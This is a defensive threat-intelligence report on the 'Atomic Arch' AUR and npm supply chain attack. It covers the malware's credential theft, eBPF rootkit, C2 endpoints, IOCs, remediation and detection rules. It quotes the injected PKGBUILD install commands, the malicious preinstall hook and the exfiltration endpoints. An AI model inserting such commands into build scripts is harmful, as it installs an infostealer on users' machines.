# Technical Analysis Report: Atomic Arch AUR Supply Chain Attack (2026-06-14)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-06-14
Version: 1.1 (FINAL)

## Executive Summary

A large-scale supply chain attack dubbed "Atomic Arch" compromised 400+ packages in the Arch User Repository (AUR) between June 9-12, 2026, delivering a Rust-compiled Linux ELF infostealer with an optional eBPF kernel rootkit. The attackers systematically adopted orphaned AUR packages through the platform's standard ownership transfer process, then poisoned PKGBUILD scripts to silently install malicious npm packages (`atomic-lockfile@1.4.2`, `js-digest`, `lockfile-js`) during the build phase. These npm packages execute a preinstall hook (`src/hooks/deps`) that drops a ~2.9 MB ELF64 binary capable of harvesting credentials from 20+ Chromium-based browsers, Electron apps (Slack, Discord, Teams, Telegram), developer tools (GitHub, npm, OpenAI, HashiCorp Vault, Docker/Podman), SSH keys, VPN profiles, and shell histories. Exfiltration occurs via HTTP POST to `temp.sh` and Tor-based C2 via an onion service. When running as root, the malware deploys an eBPF rootkit that hides its processes, network connections, and socket inodes by hooking `getdents64()` and pinning BPF maps at `/sys/fs/bpf/hidden_pids`, `/sys/fs/bpf/hidden_names`, and `/sys/fs/bpf/hidden_inodes`. The campaign is linked to the earlier "IronWorm" npm supply chain attack based on shared Rust-async ELF design, eBPF rootkit code, Tor C2 patterns, and "atomic-*" npm naming conventions. Sonatype tracks the campaign as Sonatype-2026-003775 (CVSS 8.7). No CVE has been assigned. The scope has expanded to approximately 900-1,500 packages across multiple waves.

## Background: Arch User Repository (AUR)

The AUR is a community-driven repository for Arch Linux that hosts user-submitted PKGBUILD scripts allowing anyone to build and install software not in the official repositories. AUR packages are not vetted by Arch Linux maintainers, and build helpers (`yay`, `paru`) execute PKGBUILD scripts automatically during installation. A key feature is ownership transfer: when a maintainer abandons a package, another user can request to adopt it, inheriting the package name and its install base. This creates a powerful supply chain attack surface -- an attacker who adopts a popular orphaned package inherits trust without any code review gate.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| ~2026-06-09 | Attacker accounts begin adopting orphaned AUR packages at scale |
| 2026-06-09 to 2026-06-11 | Wave 1: ~408 packages hijacked via accounts `arojas` (forged commits), `krisztinavarga`, `franziskaweber`, `tobiaswesterburg`, `ellenmyklebust`; PKGBUILD scripts modified to run `npm install atomic-lockfile minimist chalk` |
| 2026-06-11 | Security researcher Whanos discovers and publishes preliminary reverse engineering analysis on ioctl.fail |
| 2026-06-11 | Sonatype engineers Eyad Hasan and Adam Reynolds publish campaign analysis, tracking as Sonatype-2026-003775 |
| 2026-06-12 | Wave 2: additional packages compromised using `bun install js-digest` instead of npm; attacker accounts `custodiatovar` and `veramagalhaes` observed |
| 2026-06-12 | Community detection scripts published; AUR team begins mass removal |
| 2026-06-13 | Scope estimated at ~900 packages; BleepingComputer, The Hacker News, Hackread publish coverage |
| 2026-06-14 | SafeDep publishes comprehensive IOC set; scope estimated at ~1,500 packages across multiple waves |

## Root Cause: Orphaned Package Adoption Abuse

The attackers exploited the AUR's package adoption process to claim abandoned packages en masse. Using multiple accounts (some with forged git commit metadata to impersonate legitimate maintainers like `arojas`), they gained control of packages and modified only the PKGBUILD build scripts -- the packages themselves appeared identical to the legitimate software. The poisoned PKGBUILDs inject malicious npm or bun install commands that execute during the build phase, before the package is installed, meaning the malware runs with the building user's privileges on their workstation or CI/CD environment.

## Technical Analysis of the Malicious Payload

### 1. Supply Chain Injection via PKGBUILD Poisoning

The attack vector is the AUR PKGBUILD file. Attackers modified the `build()` or post-install functions to include:

```bash
npm install atomic-lockfile minimist chalk
```

Or in Wave 2:

```bash
bun install js-digest
```

The malicious npm package `atomic-lockfile@1.4.2` (published by npm user `herbsobering`) contains a preinstall lifecycle hook in `package.json`:

```json
"preinstall": "./src/hooks/deps"
```

The file `src/hooks/deps` is a Rust-compiled Linux ELF64 binary (x86-64, PIE, dynamically linked, ~2.9 MB / 3,040,376 bytes). A second variant distributed via `js-digest` (publisher: `herbsobering`) carries a different hash. A third npm package `lockfile-js` was also used.

### 2. Credential Harvesting (Infostealer)

The payload harvests secrets from an extensive target list:

**Browser profiles (Chromium family):** Chrome, Chrome Beta/Dev, Edge, Brave, Vivaldi, Opera, Yandex, Epic, Iridium, Ungoogled Chromium, Thorium, Comodo Dragon, SRWare Iron, Cent, Slimjet, Maxthon, UC Browser, CocCoc, Naver Whale -- including Flatpak and Snap variants. Targets `Local Storage/leveldb/`, `Network/`, `Cookies`, `CookiesDefault/Cookies`.

**Electron applications:**
- **Slack:** `~/.config/Slack/`, Flatpak and Snap paths. Makes API calls: `POST /api/auth.test`, `GET /api/users.info`, `GET /api/conversations.list`
- **Microsoft Teams:** `~/.config/Microsoft/Microsoft Teams/`. Extracts tokens from `authsvc.teams.microsoft.com` and `teams.microsoft.com` with `Authorization: Bearer` and `X-Skypetoken` headers
- **Discord:** All variants -- Stable, PTB, Canary, Flatpak, Snap, Vesktop, Legcord, WebCord, ArmCord, Vencord, NativeCord, Abaddon, Disent, Ripcord, Datcord. Makes API calls: `GET /api/v9/users/@me`, `GET /api/v9/users/@me/guilds?with_counts=true`
- **Telegram:** session data harvested

**Developer credentials:**
- **GitHub:** `api.github.com` -- `GET /user`, `GET /user/repos` with `Authorization: Bearer`
- **npm:** `registry.npmjs.org` -- `GET /-/whoami`, `GET /-/v1/search`
- **OpenAI/ChatGPT:** `api.openai.com` -- token validation via stolen bearers
- **HashiCorp Vault:** `~/.vault-token`, `~/.vault/token`, `X-Vault-Token` headers

**SSH material:** Entire `~/.ssh/` directory, `known_hosts`, `known_hosts.old`, private keys (OpenSSH and PuTTY PPK format)

**Shell histories:** `~/.bash_history`, `~/.zsh_history`, `~/.local/share/fish/fish_history` -- filtered for sensitive commands (`sftp`, `ssh-keygen`, `ssh-copy-id`, `ssh-add`, `rsync`, `putty`, `plink`, `docker`, `docker-compose`, `podman`)

**Docker/Podman:** `~/.docker/config.json`, Podman registry credentials, command histories

**VPN:** `*.ovpn` files, passphrase strings from VPN configs

### 3. C2 Infrastructure

**Primary C2:** Tor onion service at `olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid[.]onion`

**C2 API endpoints:**
- `POST /api/agent` -- command tasking and result acknowledgment
- `GET /bin/sha256/linux` -- secondary payload integrity verification

**Exfiltration fallback:** `POST /upload` to `hxxps://temp[.]sh`

**Local transport:** SOCKS proxy on `127.0.0.1:<dynamic port>` for Tor connectivity. The binary downloads a Tor expert bundle at runtime.

**C2 host obfuscation:** The onion address is XOR-encrypted in the binary with a 32-byte repeating key at offset `0x1AA60`; ciphertext at `0x2DA96` (62 bytes); decode loop at `0x1209f2`.

**GitHub staging repo:** `fardewoak/nodejs-argv`

### 4. eBPF Rootkit (Root-Only)

When running as root (`geteuid() == 0`) with `CAP_BPF` or `CAP_SYS_ADMIN`, the malware loads an eBPF program (source reference: `scales.bpf.c`) that:

- **Hooks `getdents64()`** to filter directory entries from `/proc` and `/proc/net/tcp`
- **Hides PIDs** from process listings (`ps`, `top`, `htop`)
- **Hides process names** from directory enumeration
- **Hides socket inodes** from `ss`, `netstat`, `/proc/net/tcp`
- **Hides Netlink socket diagnostics**
- **Blocks debugger attachment** via PTRACE_ATTACH/PTRACE_SEIZE interception
- **Self-conceals** by inserting its own PID into hidden maps
- **Hides the SOCKS loopback transport socket**

**Pinned BPF maps** (persist across reboots):
- `/sys/fs/bpf/hidden_pids`
- `/sys/fs/bpf/hidden_names`
- `/sys/fs/bpf/hidden_inodes`

Uses libbpf API calls: `bpf_object__load`, `bpf_program__attach`, `bpf_map__pin`.

### 5. Persistence Mechanisms

**Root context:**
- Binary copied to `/var/lib/<generated_name>`
- Systemd unit at `/etc/systemd/system/<generated_name>.service` with `Restart=always`, `RestartSec=30`

**Non-root context:**
- Binary copied to `~/.config/<generated_path>`
- Systemd unit at `~/.config/systemd/user/<generated_name>.service` with `Restart=always`, `RestartSec=30`

**Single-instance enforcement:** Uses `flock()` to prevent multiple concurrent instances.

### 6. Anti-Forensics / Evasion Techniques

- **Stripped binary** with Rust async state machines obscuring control flow
- **Runtime XOR decoding** of C2 address prevents static string extraction
- **eBPF rootkit** hides all process and network artifacts when running as root
- **SIGPIPE ignored** and stdio redirected to `/dev/null`
- **Git commit forgery** -- attacker spoofed commit metadata to impersonate legitimate maintainers
- **Selective directory exclusion** -- skips `node_modules`, `target`, `__pycache__` during credential scanning to reduce noise
- **Capability check** -- reads `CapEff:` from `/proc/self/status` to gate rootkit deployment

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)
> - Email addresses: `[at]` replacing @ (e.g., `attacker[at]evil[.]com`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| `atomic-lockfile` (npm) | 1.4.2 | Primary malicious npm package; preinstall hook drops ELF payload |
| `js-digest` (npm/bun) | Unknown | Wave 2 variant; different binary hash |
| `lockfile-js` (npm) | Unknown | Third variant used in later waves |
| ~408-1,500 AUR packages | Various | Orphaned packages adopted and PKGBUILD-poisoned (e.g., `alvr`, `premake-git`, `bitcoin-core-git`, `123pan-bin`, `actual-ai`) |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Linux | `src/hooks/deps` (in npm pkg) | `6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b` | Primary ELF64 payload (2.9 MB, Rust, PIE) |
| Linux | `src/hooks/deps` (js-digest variant) | `7883bda1ff15425f2dbe622c45a3ae105ddfa6175009bbf0b0cad9bf5c79b316` | Wave 2 ELF payload |
| Linux | Unknown variant | `47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204` | Third observed payload hash |
| Linux | `/var/lib/<generated_name>` | -- | Root persistence binary location |
| Linux | `~/.config/<generated_path>` | -- | Non-root persistence binary location |
| Linux | `/etc/systemd/system/<generated_name>.service` | -- | Root systemd persistence unit |
| Linux | `~/.config/systemd/user/<generated_name>.service` | -- | Non-root systemd persistence unit |
| Linux | `/sys/fs/bpf/hidden_pids` | -- | Pinned BPF map for PID hiding |
| Linux | `/sys/fs/bpf/hidden_names` | -- | Pinned BPF map for name hiding |
| Linux | `/sys/fs/bpf/hidden_inodes` | -- | Pinned BPF map for inode hiding |

**Primary payload MD5:** `42b59fdbe1b72895b2951412222ebf40`

### Network

| Type | Value | Context |
|------|-------|---------|
| Onion Domain | `olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid[.]onion` | Primary C2 -- command tasking via `/api/agent` |
| Domain | `temp[.]sh` | Fallback exfiltration via HTTP POST `/upload` |
| URL Pattern | `POST /api/agent HTTP/1.0` | C2 command channel |
| URL Pattern | `POST /upload HTTP/1.1` | Data exfiltration to temp[.]sh |
| URL Pattern | `GET /bin/sha256/linux` | Secondary payload download/verification |
| GitHub | `fardewoak/nodejs-argv` | Staging repository |

### Behavioral

- Process reads `CapEff:` from `/proc/self/status` to determine rootkit eligibility
- Process reads `/etc/machine-id` for host fingerprinting
- Systemd services created with `Restart=always` and `RestartSec=30`
- eBPF programs loaded via libbpf attaching to `getdents64()` tracepoint
- SOCKS proxy listener on `127.0.0.1` with dynamic port for Tor transport
- Binary downloads Tor expert bundle at runtime (string: `tor-expert-bundle-.tar.gz`)
- Filtered shell history scanning for SSH/Docker/VPN-related commands
- API validation calls to `api.github.com`, `registry.npmjs.org`, `api.openai.com`, `discord.com`, `teams.microsoft.com`, `slack.com` using stolen tokens

### Attacker Accounts

| Platform | Account | Role |
|----------|---------|------|
| AUR | `arojas` (impersonated) | Wave 1 -- commit forgery |
| AUR | `krisztinavarga` | Wave 1 maintainer |
| AUR | `franziskaweber` | Wave 1 maintainer |
| AUR | `tobiaswesterburg` | Wave 1 maintainer |
| AUR | `ellenmyklebust` | Wave 1 maintainer |
| AUR | `custodiatovar` | Wave 2 maintainer |
| AUR | `veramagalhaes` | Wave 2 maintainer |
| npm | `herbsobering` | Publisher of atomic-lockfile, js-digest |
| GitHub | `herbsobering430` | Container image account |
| GitHub | `fardewoak` | Staging repo owner |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Compromise Software Supply Chain | Hijacked 400+ orphaned AUR packages via ownership transfer, poisoned PKGBUILD scripts |
| T1059.004 | Unix Shell | PKGBUILD shell commands execute `npm install` / `bun install` to trigger payload |
| T1204.002 | Malicious File | ELF binary executed via npm preinstall lifecycle hook without user interaction |
| T1543.002 | Systemd Service | Persistence via system and user systemd units with Restart=always |
| T1014 | Rootkit | eBPF rootkit hides PIDs, process names, socket inodes via getdents64 hook |
| T1564.001 | Hidden Files and Directories | BPF maps pinned under /sys/fs/bpf/ to hide processes and connections |
| T1555.003 | Credentials from Web Browsers | Harvests cookies, tokens, local storage from 20+ Chromium-based browsers |
| T1539 | Steal Web Session Cookie | Extracts session data from Slack, Teams, Discord, Telegram |
| T1552.004 | Private Keys | Steals SSH keys (OpenSSH and PuTTY PPK), VPN credentials |
| T1552.001 | Credentials In Files | Harvests GitHub tokens, npm tokens, Vault tokens, Docker/Podman creds |
| T1041 | Exfiltration Over C2 Channel | Data sent to Tor onion C2 via SOCKS proxy |
| T1048.002 | Exfiltration Over Asymmetric Encrypted Non-C2 Protocol | Fallback exfil via HTTPS POST to temp[.]sh |
| T1082 | System Information Discovery | Reads CapEff from /proc/self/status and geteuid() to determine privilege level for rootkit deployment |
| T1562.001 | Disable or Modify Tools | Kills debugger attachment via PTRACE interception |
| T1027 | Obfuscated Files or Information | XOR-encrypted C2 onion address with 32-byte repeating key (string obfuscation, not packing) |

## Impact Assessment

**Breadth:** 400-1,500 AUR packages compromised across multiple waves, potentially affecting any Arch Linux user who installed or updated affected packages between June 9-14, 2026. The AUR is used by millions of Arch Linux, Manjaro, and EndeavourOS users.

**Depth:** Full credential harvest across developer toolchains (GitHub, npm, Docker, SSH, cloud APIs), communication platforms (Slack, Teams, Discord), and browsers. When running as root, the eBPF rootkit provides near-complete process and network stealth.

**Stealth:** The eBPF rootkit makes detection extremely difficult from within a running compromised system. The attack only modifies build instructions, not the actual package source, making code review of the software itself ineffective.

**Attribution:** Linked to the IronWorm campaign (documented June 5, 2026) based on shared Rust-async ELF binary architecture, eBPF rootkit code, Tor C2 patterns, and "atomic-*" npm naming conventions.

## Detection & Remediation

### Immediate Detection

**Check for compromised packages:**
```bash
# Compare installed AUR packages against known-compromised list
comm -1 -2 <(pacman -Qq | sort) <(curl -s https://raw.githubusercontent.com/lenucksi/aur-malware-check/main/package_list.txt | sort)
```

**Check for eBPF rootkit artifacts:**
```bash
ls -la /sys/fs/bpf/hidden_pids /sys/fs/bpf/hidden_names /sys/fs/bpf/hidden_inodes 2>/dev/null
bpftool prog list
bpftool map list
```

**Check for persistence:**
```bash
grep -r "Restart=always" /etc/systemd/system/ 2>/dev/null
grep -r "RestartSec=30" /etc/systemd/system/ 2>/dev/null
find /home -path "*/.config/systemd/user/*.service" -exec grep -l "Restart=always" {} \;
find /var/lib/ -type f -executable -newer /var/lib/pacman 2>/dev/null
```

**Check for malicious npm packages:**
```bash
find ~/.npm /root/.npm /tmp /var/tmp -name "atomic-lockfile" -type d 2>/dev/null
find ~/.npm /root/.npm /tmp /var/tmp -name "js-digest" -type d 2>/dev/null
find ~/.npm /root/.npm /tmp /var/tmp -name "lockfile-js" -type d 2>/dev/null
find / -type f -name "deps" -path "*/src/hooks/*" 2>/dev/null
```

**Check by hash:**
```bash
find / -type f -size 3040376c -exec sha256sum {} \; 2>/dev/null | grep -i "6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"
```

### Remediation

1. **Isolate** affected systems from the network immediately
2. **Boot from trusted media** (live USB/ISO) to inspect the filesystem offline -- the eBPF rootkit can hide artifacts from a running system
3. **Remove** malicious systemd units from `/etc/systemd/system/` and `~/.config/systemd/user/`
4. **Remove** malicious binaries from `/var/lib/` and `~/.config/`
5. **Remove** pinned BPF maps from `/sys/fs/bpf/`
6. **Purge** npm/bun caches: `rm -rf ~/.npm/*/atomic-lockfile ~/.npm/*/js-digest ~/.npm/*/lockfile-js`
7. **Rotate ALL credentials:** SSH keys, GitHub PATs, npm tokens, Docker registry creds, Vault tokens, OpenAI API keys, browser sessions, Slack/Teams/Discord tokens, VPN certificates
8. **Review** AUR package installation dates in `/var/log/pacman.log` for June 9-14, 2026 window
9. **Consider full OS reinstall** if root compromise is confirmed

### Long-Term Hardening

- **Advisory:** Use `--ignore-scripts` with npm/bun for untrusted packages to prevent preinstall hook execution (note: this may break legitimate packages that rely on install scripts)
- **Advisory:** Review PKGBUILD diffs before installing or updating AUR packages; use `yay --diff` or `paru --review`
- **Advisory:** Avoid adopting packages from unknown AUR maintainers; verify maintainer history
- **Advisory:** Monitor `/sys/fs/bpf/` for unexpected pinned maps as part of routine security auditing
- **Advisory:** Run AUR builds in isolated containers or VMs to limit blast radius
- Note: These are interim mitigations whose efficacy depends on individual configuration and workflow; they are not comprehensive fixes for the underlying AUR trust model

## Detection Rules

These detections target the Atomic Arch campaign's distinctive artifacts: eBPF rootkit map names, npm preinstall hook execution paths, file-level signatures of the Rust ELF payload, and network exfiltration to temp[.]sh. All rules are PoC/advisory-specific (default altitude, strict). The generic systemd persistence rule and temp.sh DNS query rule were dropped during review (no campaign-specific discriminating power). Network rules for temp.sh are supporting indicators only — pair with host-level IOCs. Compiles does not equal fires -- verify in your telemetry pipeline before promoting to production.

### Sigma: Atomic Arch eBPF Rootkit Pinned BPF Maps

Detects creation of the three pinned BPF maps (`hidden_pids`, `hidden_names`, `hidden_inodes`) under `/sys/fs/bpf/` that the Atomic Arch rootkit uses to hide processes, names, and socket inodes.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Map names are campaign-specific strings from published ioctl.fail analysis; no known benign software uses this exact naming triple. No pipeline-mapped conversion available for generic linux/file_event. -->
```yaml
title: Atomic Arch eBPF Rootkit Pinned BPF Maps
id: 8f3a2c1d-4e7b-4a9f-b5d6-2c8e1f0a3d7b
status: experimental
description: >
    Detects creation of pinned BPF maps used by the Atomic Arch eBPF rootkit
    to hide processes, process names, and socket inodes from system tools.
references:
    - https://ioctl.fail/preliminary-analysis-of-aur-malware/
    - https://safedep.io/ti/campaigns/atomic-arch/
author: Actioner
date: 2026/06/14
tags:
    - attack.t1014
    - attack.t1564.001
logsource:
    category: file_event
    product: linux
detection:
    selection:
        TargetFilename|startswith: '/sys/fs/bpf/'
        TargetFilename|endswith:
            - '/hidden_pids'
            - '/hidden_names'
            - '/hidden_inodes'
    condition: selection
falsepositives:
    - Legitimate eBPF-based security or observability tools using identically named maps (unlikely)
level: critical
```

### Sigma: Atomic Arch Systemd Persistence Unit Creation — DROPPED
<!-- revision: dropped per critic — TTP rule mislabeled as specific. No campaign artifact (no specific service name, binary path, or hash). Fires on Docker, Tailscale, pip-installed daemons, etc. Thousands of benign fires per fleet per day. -->
Rule removed: generic systemd unit creation detection had no campaign-specific artifact and would produce excessive false positives in production environments.

### Sigma: Atomic Arch Malicious npm Preinstall Hook Execution

Detects execution of the `deps` binary from the `src/hooks/` path (the npm preinstall hook) or process creation with parent npm/bun referencing the known malicious package names.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Image path src/hooks/deps is the exact published artifact from ioctl.fail and Sonatype analyses. Package names atomic-lockfile/js-digest/lockfile-js are campaign-specific. Requires process_creation logging (Sysmon for Linux or auditd). -->
```yaml
title: Atomic Arch Malicious npm Preinstall Hook Execution
id: c5d8f1a3-6b2e-49c7-a0d4-3e9f7b1c5a8d
status: experimental
description: >
    Detects execution of the malicious preinstall hook binary (deps) from the
    atomic-lockfile or js-digest npm packages used in the Atomic Arch AUR
    supply chain attack.
references:
    - https://ioctl.fail/preliminary-analysis-of-aur-malware/
    - https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency
author: Actioner
date: 2026/06/14
tags:
    - attack.t1059.004
    - attack.t1195.002
logsource:
    category: process_creation
    product: linux
detection:
    selection_path:
        Image|endswith: '/src/hooks/deps'
    selection_parent:
        ParentImage|endswith:
            - '/node'
            - '/npm'
            - '/npx'
            - '/bun'
        CommandLine|contains:
            - 'atomic-lockfile'
            - 'js-digest'
            - 'lockfile-js'
    condition: selection_path or selection_parent
falsepositives:
    - Legitimate npm packages named atomic-lockfile (none known)
level: critical
```

### Snort: Atomic Arch Exfiltration POST to temp.sh

Detects HTTP POST to `/upload` on `temp.sh`, the fallback exfiltration channel used by the Atomic Arch payload. Supporting indicator only — temp.sh is a legitimate file-sharing service; pair with host-level IOCs (eBPF maps, YARA hit, npm hook) for actionable alerting.
**Status:** compile ⚠️ uncompiled (Snort not installed, structural check only) · confidence: low
<!-- audit: structural check only — Snort 3 not on PATH. Rule uses http service, http_method + http_uri + http_header sticky buffers. temp.sh is a legitimate file-sharing service widely used by Linux devs and CI pipelines; downgraded from medium to low per critic review. Must be paired with host-level IOCs for any actionable response. -->
<!-- revision: downgraded confidence medium→low; added supporting-indicator caveat per critic verdict. -->
```snort
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Actioner - Atomic Arch Exfiltration POST to temp.sh [Supporting Indicator]";
    flow:established, to_server;
    http_method;
    content:"POST";
    http_uri;
    content:"/upload", fast_pattern;
    http_header;
    content:"temp.sh";
    classtype:trojan-activity;
    reference:url,ioctl.fail/preliminary-analysis-of-aur-malware/;
    metadata:author Actioner, created 2026-06-14;
    sid:2100001;
    rev:2;
)
```

### Suricata: Atomic Arch Exfiltration to temp.sh

Detects HTTP POST to `/upload` on `temp.sh` used for data exfiltration by the Atomic Arch payload. Supporting indicator only — temp.sh is a legitimate file-sharing service; pair with host-level IOCs for actionable alerting.
**Status:** compile ✅ compiles · confidence: low
<!-- audit: suricata -T exit 0. Uses http protocol with dot-notation buffers. temp.sh is a legitimate file-sharing service widely used by Linux devs and CI pipelines; downgraded from medium to low per critic review. Must be paired with host-level IOCs. -->
<!-- revision: downgraded confidence medium→low; added supporting-indicator caveat; dropped DNS query rule (sid:2200002) — DNS query for legitimate public service has zero discriminating power. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Atomic Arch Exfiltration to temp.sh [Supporting Indicator]"; flow:established,to_server; http.method; content:"POST"; http.host; content:"temp.sh"; http.uri; content:"/upload"; classtype:trojan-activity; reference:url,ioctl.fail/preliminary-analysis-of-aur-malware/; metadata:author Actioner, created_at 2026-06-14; sid:2200001; rev:2;)
```

### Suricata: Atomic Arch DNS Query for temp.sh — DROPPED
<!-- revision: dropped per critic — DNS query for temp.sh, a legitimate public file-sharing service, has zero discriminating power. -->
Rule removed: DNS lookup for a legitimate public service provides no discriminating signal.

### YARA: Atomic Arch deps ELF Payload

Detects the Atomic Arch Rust-compiled ELF payload via characteristic eBPF map names, SOCKS proxy strings, and C2 API paths published in the ioctl.fail and SafeDep analyses.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. yara fired on constructed positive (ELF magic + published strings hidden_pids/hidden_names/hidden_inodes/socks greeting write/socks CONNECT write//api/agent/tor-expert-bundle-/CapEff://etc/machine-id); quiet on benign ELF negative. Strings sourced from ioctl.fail published analysis — not invented to match. Condition requires ELF magic + filesize <10MB + combinatorial string matching across bpf/socks/api/tor clusters to minimize FP. -->
```yara
rule Malware_AtomicArch_Deps_ELF
{
    meta:
        description = "Detects the Atomic Arch deps ELF payload via characteristic strings from the Rust-compiled infostealer/rootkit binary"
        author = "Actioner"
        date = "2026-06-14"
        reference = "https://ioctl.fail/preliminary-analysis-of-aur-malware/"
        hash = "6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"
        severity = "critical"

    strings:
        $bpf1 = "hidden_pids" ascii
        $bpf2 = "hidden_names" ascii
        $bpf3 = "hidden_inodes" ascii
        $socks1 = "socks greeting write" ascii
        $socks2 = "socks CONNECT write" ascii
        $socks3 = "socks CONNECT failed: rep=" ascii
        $socks4 = "socks5 auth rejected" ascii
        $api1 = "/api/agent" ascii
        $api2 = "/bin/sha256/linux" ascii
        $cap = "CapEff:" ascii
        $machid = "/etc/machine-id" ascii
        $tor1 = "tor-expert-bundle-" ascii

    condition:
        uint32(0) == 0x464C457F and
        filesize < 10MB and
        (
            (2 of ($bpf*) and 1 of ($socks*)) or
            (2 of ($socks*) and $api1) or
            ($api1 and $api2 and $tor1) or
            (3 of ($bpf*) and $cap and $machid)
        )
}
```

## Lessons Learned

1. **Package registries with open adoption are supply chain attack surfaces.** The AUR's trust model -- where anyone can adopt an orphaned package and inherit its name, reputation, and install base -- is fundamentally exploitable. This attack demonstrates the model at scale, with a single actor claiming hundreds of packages in days. Build systems that execute arbitrary code from community repositories need defense-in-depth: sandboxed builds, PKGBUILD diff review, and maintainer identity verification.

2. **eBPF is a growing rootkit vector on Linux.** The Atomic Arch and IronWorm campaigns demonstrate that eBPF-based rootkits are now operational in commodity malware, not just nation-state tools. Defenders should monitor `/sys/fs/bpf/` for unexpected pinned maps and use `bpftool` for BPF program auditing. Kernel lockdown mode and BPF signing can limit unauthorized eBPF program loading.

3. **npm lifecycle hooks remain a persistent attack vector.** The `preinstall` hook executes arbitrary code before dependency resolution, making it an ideal staging mechanism for supply chain payloads. The `--ignore-scripts` flag is the primary mitigation but breaks many legitimate packages. The ecosystem needs a better model for declaring and gating install-time code execution.

4. **Cross-ecosystem attacks multiply impact.** This campaign bridges two ecosystems (AUR + npm) to reach a target population (Arch Linux developers) that neither ecosystem's security tooling alone would catch. Multi-ecosystem supply chain attacks will likely become more common.

## Sources

- [ioctl.fail — Preliminary Analysis of AUR Malware](https://ioctl.fail/preliminary-analysis-of-aur-malware/) — primary technical reverse engineering analysis by Whanos; full indicator set including onion C2 host, binary metadata, eBPF details
- [Sonatype Blog — Atomic Arch npm Campaign](https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency) — campaign identification and npm package analysis by Eyad Hasan and Adam Reynolds; Sonatype-2026-003775 tracking
- [SafeDep Threat Intelligence — Atomic Arch Campaign](https://safedep.io/ti/campaigns/atomic-arch/) — comprehensive IOC set including hashes, C2 infrastructure, attacker accounts, credential targets, detection commands
- [The Hacker News — Over 400 Arch Linux AUR Packages Hijacked](https://thehackernews.com/2026/06/over-400-arch-linux-aur-packages.html) — news coverage with technical details on eBPF rootkit, persistence, and infostealer scope
- [BleepingComputer — Over 400 Arch Linux Packages Compromised](https://www.bleepingcomputer.com/news/security/over-400-arch-linux-packages-compromised-to-push-rootkit-infostealer/) — news coverage; references IFIN, Michael Taggart, Whanos, Sonatype
- [Hackread — Atomic Arch Hijacks Linux AUR Packages](https://hackread.com/atomic-arch-hijacks-linux-aur-packages-malware/) — news coverage with IronWorm campaign linkage
- [The CyberSec Guru — Atomic Arch: 900+ AUR Packages Backdoored](https://thecybersecguru.com/news/atomic-arch-aur-supply-chain-attack-ebpf-rootkit/) — detailed IOC extraction including attacker accounts, persistence paths, credential targets, detection commands
- [GitHub — lenucksi/aur-malware-check](https://github.com/lenucksi/aur-malware-check) — community detection tools including 446+ compromised package names, installation date filtering, npm cache scanning
- [GitHub Gist — Kidev/59bf9f5fb53ab5eee99f19a6a2fc3992](https://gist.github.com/Kidev/59bf9f5fb53ab5eee99f19a6a2fc3992) — community detection script with hardcoded compromised package list

---
*Report generated by Actioner*
